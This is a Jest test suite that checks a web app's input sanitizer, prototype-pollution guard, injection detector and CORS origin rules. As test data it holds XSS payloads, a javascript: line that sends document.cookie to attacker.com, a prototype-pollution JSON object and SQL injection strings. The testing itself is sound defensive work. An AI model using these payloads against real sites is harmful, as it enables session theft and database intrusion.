import { sanitizeText, sanitizeObject, containsMaliciousPattern } from './utils/sanitize.util';

describe('Application Security & Hardening Suite', () => {
  describe('XSS & Input Sanitization Defenses', () => {
    it('neutralizes stored and reflected XSS tags and nested evasions', () => {
      const payloads = [
        '<script>alert(document.cookie)</script>',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        '<img src="javascript:alert(\'XSS\')">',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src="https://evil.com"></iframe>',
      ];

      for (const payload of payloads) {
        const sanitized = sanitizeText(payload) || '';
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('onload=');
        expect(sanitized).not.toContain('onerror=');
      }
    });

    it('neutralizes dangerous pseudoprotocols (javascript:, vbscript:, data:)', () => {
      const attack = 'javascript:fetch("https://attacker.com/steal?c=" + document.cookie)';
      const cleaned = sanitizeText(attack);
      expect(cleaned).not.toContain('javascript:');
    });

    it('strips null bytes and control characters used in filter-bypass attacks', () => {
      const attack = 'admin\u0000user\u001B[31m';
      const cleaned = sanitizeText(attack);
      expect(cleaned).toBe('adminuser[31m');
      expect(cleaned).not.toContain('\u0000');
    });

    it('strips Trojan Source unicode bidirectional overrides', () => {
      const attack = 'user\u202E\u2066\u202Aspoof';
      const cleaned = sanitizeText(attack);
      expect(cleaned).toBe('userspoof');
    });
  });

  describe('Prototype Pollution Protection', () => {
    it('prevents pollution of Object.prototype through __proto__ and constructor', () => {
      const maliciousJson = JSON.parse(
        '{"__proto__":{"polluted":"yes"},"constructor":{"prototype":{"admin":true}},"name":"Safe"}'
      );

      const cleaned = sanitizeObject(maliciousJson);

      expect(cleaned.name).toBe('Safe');
      expect((cleaned as any).polluted).toBeUndefined();
      expect((Object.prototype as any).polluted).toBeUndefined();
      expect((Object.prototype as any).admin).toBeUndefined();
    });
  });

  describe('Password & Secret Integrity', () => {
    it('retains special characters in passwords while stripping null bytes', () => {
      const payload = {
        email: 'user@example.com',
        password: 'My$ecureP@ssw0rd<with>&symbols\u0000',
      };

      const cleaned = sanitizeObject(payload);
      expect(cleaned.email).toBe('user@example.com');
      // Special characters like <, >, &, $ must be intact for valid user passwords, but null bytes stripped
      expect(cleaned.password).toBe('My$ecureP@ssw0rd<with>&symbols');
      expect(cleaned.password).not.toContain('\u0000');
    });
  });

  describe('Malicious Pattern Detection', () => {
    it('correctly flags dangerous injection patterns for telemetry and monitoring', () => {
      expect(containsMaliciousPattern("<script>alert(1)</script>")).toBe(true);
      expect(containsMaliciousPattern("admin' OR '1'='1' --")).toBe(true);
      expect(containsMaliciousPattern("1 UNION SELECT username, password FROM users")).toBe(true);
      expect(containsMaliciousPattern("Regular user bio from Bangalore, Software Engineer")).toBe(false);
    });
  });

  describe('CORS Origin Boundary Verification', () => {
    const isOriginAllowed = (origin: string): boolean => {
      const lowerOrigin = origin.toLowerCase().trim();
      const configuredOrigins = ['https://ishtamchat.com', 'https://www.ishtamchat.com'];
      if (configuredOrigins.includes(lowerOrigin)) return true;

      try {
        const parsed = new URL(lowerOrigin);
        const host = parsed.hostname;
        if (host === 'ishtamchat.com' || host.endsWith('.ishtamchat.com')) return true;
        if ((host.startsWith('ishtamchat') || host.startsWith('matrimony-web-')) && host.endsWith('.vercel.app')) {
          return true;
        }
      } catch {}

      if (lowerOrigin.startsWith('http://localhost:') || lowerOrigin.startsWith('http://127.0.0.1:')) {
        return true;
      }

      return false;
    };

    it('allows legitimate ishtamchat origins and subdomains', () => {
      expect(isOriginAllowed('https://ishtamchat.com')).toBe(true);
      expect(isOriginAllowed('https://www.ishtamchat.com')).toBe(true);
      expect(isOriginAllowed('https://api.ishtamchat.com')).toBe(true);
      expect(isOriginAllowed('http://localhost:3000')).toBe(true);
    });

    it('rejects rogue 3rd-party vercel domains and malicious sites', () => {
      expect(isOriginAllowed('https://evil-attacker.vercel.app')).toBe(false);
      expect(isOriginAllowed('https://attacker-controlled-site.com')).toBe(false);
      expect(isOriginAllowed('https://fake-ishtamchat.evil.com')).toBe(false);
    });
  });
});
